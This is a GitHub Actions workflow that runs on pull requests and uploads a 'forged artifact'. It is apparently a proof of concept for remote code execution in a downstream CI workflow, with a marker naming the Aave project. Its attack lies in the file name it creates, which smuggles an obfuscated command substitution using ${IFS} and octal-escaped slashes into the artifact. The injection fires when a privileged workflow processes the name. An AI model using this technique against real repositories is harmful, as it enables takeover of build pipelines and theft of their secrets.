name: Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged artifact
        run: |
          mkdir -p /tmp/content
          echo 1 > /tmp/content/pr_number.txt
          echo hello > /tmp/content/pwn.txt
          echo 'RCE-PROOF-AAVE-MARKER' > /tmp/content/marker.txt
          read -r f <<'NAME'
          $(printf pwn; cp${IFS}$(printf '\57')tmp$(printf '\57')content$(printf '\57')content$(printf '\57')marker.txt${IFS}$(printf '\57')tmp$(printf '\57')content$(printf '\57')content$(printf '\57')pwn.txt).txt
          NAME
          touch "/tmp/content/$f"
          ls -la /tmp/content
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: /tmp/content
